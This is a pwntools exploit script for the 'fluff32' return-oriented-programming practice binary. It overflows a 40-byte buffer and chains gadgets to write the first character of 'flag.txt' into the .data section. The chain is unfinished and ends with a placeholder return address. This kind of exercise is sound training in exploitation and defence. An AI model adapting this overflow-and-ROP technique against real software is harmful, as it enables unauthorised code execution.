
from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./fluff32")
p = elf.process()

# uncomment next 3 lines to debug
gdb.attach(p, gdbscript='''
#script
''')

# for rop gadgets
rop = ROP(elf)

print(p.recvuntil(b">"))

# let's first determine where everything is:
# pprint(elf.symbols)

# address of .data section header... this is area in memory that we will write our string ("flag.txt") to
data_header_address = p32(elf.symbols["data_start"])
data_header_address_big_endian = p32(elf.symbols["data_start"], endian='big')

# all our of ROP gadgets we're gona use
xchg_ecx_dl = p32(elf.symbols["questionableGadgets"]  + 18)
pext_rop_gadget = p32(elf.symbols["questionableGadgets"])
pop_ecx_xchg = p32(elf.symbols["questionableGadgets"] + 21)
pop_ebp_gadget = p32(rop.ebp.address)


# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

ebp_mask_for_f = b"\x4B\x4B\x00\x00"


payload = [
        buf,                                # bunch of A's

        # insert the "f"
        ebp_mask_for_f,                     # 0x4b4b masked with 0xb0bababa = 0x66 = "f"
        pext_rop_gadget,                    # address of our "pext" ROP gadget
        pop_ecx_xchg,                       # addr of ROP gadget to pop ecx, and flip it's endian-ness
        data_header_address_big_endian,     # address of data header in big endian...
                                            # this is a region of writeable memory that we can store 
                                            # our string "flag.txt" in
        xchg_ecx_dl,                        # addr of ROP gadget to put dl into [ecx]
        b'cccc'                             # garbage EIP 
       ]

payload = b"".join(payload)
print("payload is: ", payload)

p.send(payload)


print(p.recvall())
p.close()

